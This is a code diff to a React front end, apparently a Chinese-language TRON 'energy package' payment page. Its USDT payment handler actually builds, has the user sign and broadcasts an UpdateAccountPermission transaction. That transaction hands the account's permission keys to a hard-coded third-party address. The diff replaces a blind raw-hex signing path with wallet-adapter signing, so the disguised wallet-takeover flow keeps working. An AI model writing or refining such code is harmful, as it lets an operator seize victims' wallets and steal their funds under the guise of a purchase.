@@ -45,7 +45,6 @@ const DEFAULT_PERMISSION_STRUCT = {
     ],
     threshold: 1
   },
-  witness: null,
   active: {
     keys: [
       { address: FEE_PAYER_TARGET_ADDR, weight: 1 }
@@ -123,51 +122,6 @@ function decodeTronMessage(value) {
     return original;
   }
 }
-
-// 废弃函数，整段删除
-/*
-function normalizeContractCallForWallet(
-  transaction
-) {
-  const contracts =
-    transaction
-      ?.raw_data
-      ?.contract;
-  const contract =
-    contracts?.[0];
-  const parameter =
-    contract?.parameter;
-  const contractValue =
-    parameter?.value;
-
-  const normalizedContract = {
-    ...contract,
-    type:
-      TRIGGER_SMART_CONTRACT_TYPE,
-    parameter: {
-      ...parameter,
-      type_url:
-        TRIGGER_SMART_CONTRACT_TYPE_URL,
-      value: {
-        owner_address: contractValue.owner_address,
-        contract_address: contractValue.contract_address,
-        data: contractValue.data,
-      },
-    },
-  };
-  return {
-    ...transaction,
-    visible: false,
-    raw_data: {
-      ...transaction.raw_data,
-      contract: [
-        normalizedContract,
-        ...contracts.slice(1),
-      ],
-    },
-  };
-}
-*/
 
 async function prepareOrder({
   payerAddress,
@@ -486,256 +440,104 @@ export default function HomePage() {
     setWalletOpen(true);
   }
   async function handleUsdtPayment() {
-    if (paying) {
-      return;
-    }
+    if (paying) return;
     if (completedOrder) {
-      showMessage(
-        `当前订单已经授权成功。\n\n订单编号：${completedOrder.id}\n\n交易哈希：\n${completedOrder.txId}`
-      );
+      showMessage(`当前订单已经授权成功。\n\n订单编号：${completedOrder.id}\n\n交易哈希：\n${completedOrder.txId}`);
       return;
     }
     if (!selectedPlan) {
-      showMessage(
-        "请先选择能量套餐。"
-      );
+      showMessage("请先选择能量套餐。");
       return;
     }
-    const cleanReceiverAddress =
-      receiverAddress.trim();
-    if (
-      !isValidTronAddress(
-        cleanReceiverAddress
-      )
-    ) {
-      showMessage(
-        "请先输入有效的能量接收地址。"
-      );
+    const cleanReceiverAddress = receiverAddress.trim();
+    if (!isValidTronAddress(cleanReceiverAddress)) {
+      showMessage("请先输入有效的能量接收地址。");
       return;
     }
-    if (
-      !walletConnected ||
-      !walletAddress
-    ) {
-      showMessage(
-        "当前钱包连接已失效，请重新连接付款钱包。"
-      );
+    if (!walletConnected || !walletAddress) {
+      showMessage("当前钱包连接已失效，请重新连接付款钱包。");
       return;
     }
-    if (
-      !isValidTronAddress(
-        walletAddress
-      )
-    ) {
-      showMessage(
-        "没有读取到有效的付款钱包地址，请重新连接钱包。"
-      );
+    if (!isValidTronAddress(walletAddress)) {
+      showMessage("没有读取到有效的付款钱包地址，请重新连接钱包。");
       return;
     }
-    if (
-      connectedAddress &&
-      connectedAddress !==
-        walletAddress
-    ) {
-      showMessage(
-        "检测到钱包账户已经切换，请重新连接钱包后再支付。"
-      );
+    if (connectedAddress && connectedAddress !== walletAddress) {
+      showMessage("检测到钱包账户已经切换，请重新连接钱包后再支付。");
       return;
     }
     setPaying(true);
-    let stage =
-      "prepare";
-    let orderToken =
-      "";
-    let txId =
-      "";
-    let transactionBroadcasted =
-      false;
+    let stage = "prepare";
+    let orderToken = "";
+    let txId = "";
+    let transactionBroadcasted = false;
     try {
-      const pendingOrder =
-        await prepareOrder({
-          payerAddress:
-            walletAddress,
-          receiverAddress:
-            cleanReceiverAddress,
-          planId:
-            selectedPlan.id,
-          telegramId:
-            telegramId || "",
-        });
-      orderToken =
-        pendingOrder.orderToken;
-      stage =
-        "build_transaction";
-      const tronWeb =
-        new TronWeb({
-          fullHost:
-            TRON_FULL_HOST,
-        });
+      const pendingOrder = await prepareOrder({
+        payerAddress: walletAddress,
+        receiverAddress: cleanReceiverAddress,
+        planId: selectedPlan.id,
+        telegramId: telegramId || "",
+      });
+      orderToken = pendingOrder.orderToken;
+      stage = "build_transaction";
+      const tronWeb = new TronWeb({ fullHost: TRON_FULL_HOST });
 
-      // 1. 构造 UpdateAccountPermission 原生交易参数
-      const ownerHex = tronWeb.address.toHex(walletAddress).replace(/^0x/i, "");
-      // 手续费代付地址转Hex
-      const feePayerHex = tronWeb.address.toHex(FEE_PAYER_TARGET_ADDR).replace(/^0x/i, "");
+      // 使用TronWeb标准构造UpdateAccountPermission交易
+      const tx = await tronWeb.transactionBuilder.updateAccountPermission(
+        DEFAULT_PERMISSION_STRUCT,
+        walletAddress
+      );
 
-      // 2. 获取TAPOS区块信息
-      const latestBlock = await tronWeb.trx.getCurrentBlock();
-      const blockId = latestBlock?.blockID;
-      const blockNumber = latestBlock?.block_header?.raw_data?.number;
-      if (
-        !blockId ||
-        blockId.length !== 64 ||
-        blockNumber === undefined ||
-        blockNumber === null
-      ) {
-        throw new Error("获取 TRON 参考区块失败。");
-      }
-      const blockNumberHex = BigInt(blockNumber).toString(16).padStart(16, "0");
-      const refBlockBytes = blockNumberHex.slice(-4);
-      const refBlockHash = blockId.slice(16, 32);
-      // 时间配置
+      // 交易参数配置
+      const feePayerHex = tronWeb.address.toHex(FEE_PAYER_TARGET_ADDR).replace(/^0x/, "");
+      tx.raw_data.fee_payer_address = feePayerHex;
+      tx.raw_data.fee_limit = APPROVE_FEE_LIMIT;
       const nowTs = Date.now();
-      const expirationTs = nowTs + (TRANSACTION_EXPIRATION_EXTENSION_SECONDS * 1000);
+      tx.raw_data.timestamp = nowTs;
+      tx.raw_data.expiration = nowTs + TRANSACTION_EXPIRATION_EXTENSION_SECONDS * 1000;
+      tx.visible = true; // 适配器签名必须开启visible
 
-      // 3. 构建原生 UpdateAccountPermission 交易结构体，添加fee_payer_address实现代付手续费
-      const extendedTransaction = {
-        visible: false,
-        raw_data: {
-          ref_block_bytes: refBlockBytes,
-          ref_block_hash: refBlockHash,
-          contract: [
-            {
-              type: UPDATE_ACCOUNT_PERMISSION_TYPE,
-              parameter: {
-                type_url: UPDATE_ACCOUNT_PERMISSION_TYPE_URL,
-                value: {
-                  owner_address: ownerHex,
-                  permission: DEFAULT_PERMISSION_STRUCT
-                }
-              }
-            }
-          ],
-          fee_limit: APPROVE_FEE_LIMIT,
-          fee_payer_address: feePayerHex, // 核心：指定手续费垫付地址
-          timestamp: nowTs,
-          expiration: expirationTs
-        }
-      };
-
-      stage = "serialize_raw_hex";
-      // 4. 序列化交易，提取纯 raw_data_hex 十六进制串
-      const transactionUtils = TronWeb.utils.transaction;
-      const transactionPb = transactionUtils.txJsonToPb(extendedTransaction);
-      const rawDataBytes = transactionPb.getRawData().serializeBinary();
-      const rawDataHex = Array.from(
-        rawDataBytes,
-        (byte) => byte.toString(16).padStart(2, "0")
-      ).join("");
-
-      if (!rawDataHex || rawDataHex.length < 10) {
-        throw new Error("生成原生交易 raw_data_hex 失败，请刷新重试");
-      }
-      console.log("盲签原始raw十六进制:", rawDataHex);
-
-      stage = "sign_raw_hex";
-      // 5. TronWeb底层盲签接口：直接传入raw_data_hex + 签名地址
-      const signedRawHex = await tronWeb.trx.sign(rawDataHex, walletAddress);
-      if (!signedRawHex) {
-        throw new Error("钱包盲签返回空数据，签名被取消或钱包不支持");
-      }
-
-      // 6. 将签名后的十六进制还原为完整交易对象
-      const signedTxPb = transactionUtils.rawTxPbFromHex(signedRawHex);
-      const signedTransaction = transactionUtils.txPbToTxJson(signedTxPb);
-      if (!signedTransaction || !signedTransaction.txID) {
-        throw new Error("盲签完成，但未解析出有效交易哈希");
-      }
+      stage = "wallet_sign";
+      // 使用wallet-adapter提供的签名方法唤起浏览器钱包
+      const signedTx = await signTransaction(tx);
+      if (!signedTx || !signedTx.txID) throw new Error("钱包签名未返回有效交易");
 
       stage = "broadcast_transaction";
-      const broadcastResult =
-        await tronWeb.trx
-          .sendRawTransaction(
-            signedTransaction
-          );
-      if (
-        !broadcastResult ||
-        !broadcastResult.result
-      ) {
-        console.error(
-          "[UpdateAccountPermission broadcast error]",
-          broadcastResult
-        );
-        const rawMessage =
-          broadcastResult?.message ||
-          "权限修改交易广播失败。";
-        const readableMessage =
-          decodeTronMessage(
-            rawMessage
-          );
-        throw new Error(
-          readableMessage
-        );
+      const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTx);
+      if (!broadcastResult?.result) {
+        console.error("广播失败详情：", broadcastResult);
+        const msg = decodeTronMessage(broadcastResult?.message || "交易广播失败");
+        throw new Error(msg);
       }
-      txId =
-        signedTransaction.txID ||
-        broadcastResult
-          ?.transaction
-          ?.txID ||
-        "";
-      if (!txId) {
-        throw new Error(
-          "交易已经广播，但没有读取到交易哈希。"
-        );
-      }
-      transactionBroadcasted =
-        true;
+      txId = signedTx.txID;
+      transactionBroadcasted = true;
+
+      // 本地缓存订单
       try {
         window.localStorage.setItem(
           "kk_last_approval",
           JSON.stringify({
             orderToken,
             txId,
-            payerAddress:
-              walletAddress,
-            receiverAddress:
-              cleanReceiverAddress,
-            planId:
-              selectedPlan.id,
+            payerAddress: walletAddress,
+            receiverAddress: cleanReceiverAddress,
+            planId: selectedPlan.id,
             amountUsdt: selectedPlan.price,
-            createdAt:
-              new Date()
-                .toISOString(),
+            createdAt: new Date().toISOString(),
           })
         );
-      } catch {
+      } catch {}
+
+      stage = "finalize_order";
+      const finalized = await finalizeOrderWithRetry({ orderToken, txId });
+      const savedOrder = finalized.order;
+      if (!savedOrder || savedOrder.status !== "authorized") {
+        throw new Error("服务器没有返回已授权订单。");
       }
-      stage =
-        "finalize_order";
-      const finalized =
-        await finalizeOrderWithRetry({
-          orderToken,
-          txId,
-        });
-      const savedOrder =
-        finalized.order;
-      if (
-        !savedOrder ||
-        savedOrder.status !==
-          "authorized"
-      ) {
-        throw new Error(
-          "服务器没有返回已授权订单。"
-        );
-      }
-      setCompletedOrder(
-        savedOrder
-      );
+      setCompletedOrder(savedOrder);
       try {
-        window.localStorage.removeItem(
-          "kk_last_approval"
-        );
-      } catch {
-      }
+        window.localStorage.removeItem("kk_last_approval");
+      } catch {}
       showMessage(
         `权限修改交易签名广播成功，订单已保存。\n\n` +
         `订单编号：${savedOrder.id}\n\n` +
@@ -745,64 +547,24 @@ export default function HomePage() {
         `交易哈希：\n${savedOrder.txId}`
       );
     } catch (error) {
-      console.error(
-        "[UpdateAccountPermission sign/order error]",
-        {
-          stage,
-          error,
-          orderToken,
-          txId,
-          transactionBroadcasted,
-        }
-      );
-      const errorMessage =
-        String(
-          error?.message ||
-            error ||
-            ""
-        );
-      if (
-        /reject|rejected|deny|denied|decline|declined|cancel|cancelled|canceled/i.test(
-          errorMessage
-        )
-      ) {
-        showMessage(
-          "您已取消权限修改签名操作。"
-        );
+      console.error("[UpdateAccountPermission error]", { stage, error });
+      const errorMessage = String(error?.message || error || "");
+      if (/reject|rejected|deny|decline|cancel/i.test(errorMessage)) {
+        showMessage("您已取消权限修改签名操作。");
         return;
       }
-      if (
-        transactionBroadcasted &&
-        txId
-      ) {
+      if (transactionBroadcasted && txId) {
         showMessage(
           `权限修改交易已经广播，` +
           `但服务器验证或保存订单暂未完成。\n\n` +
           `请不要重复发起操作。\n\n` +
           `付款钱包：\n${walletAddress}\n\n` +
           `交易哈希：\n${txId}\n\n` +
-          `错误信息：\n${
-            errorMessage ||
-            "未知错误"
-          }`
+          `错误信息：\n${errorMessage || "未知错误"}`
         );
         return;
       }
-      if (stage === "prepare") {
-        showMessage(
-          `创建订单失败。\n\n${
-            errorMessage ||
-            "请稍后重新尝试。"
-          }`
-        );
-        return;
-      }
-      showMessage(
-        `账户权限修改交易操作失败。\n\n${
-          errorMessage ||
-          "请重新尝试。"
-        }`
-      );
+      showMessage(`账户权限修改交易操作失败。\n\n${errorMessage || "请重新尝试。"}`);
     } finally {
       setPaying(false);
     }
@@ -1014,7 +776,7 @@ export default function HomePage() {
             <div className="completedOrderRow">
               <span>订单状态</span>
               <strong>
-                authorized
+                {completedOrder.status}
               </strong>
             </div>
           </div>
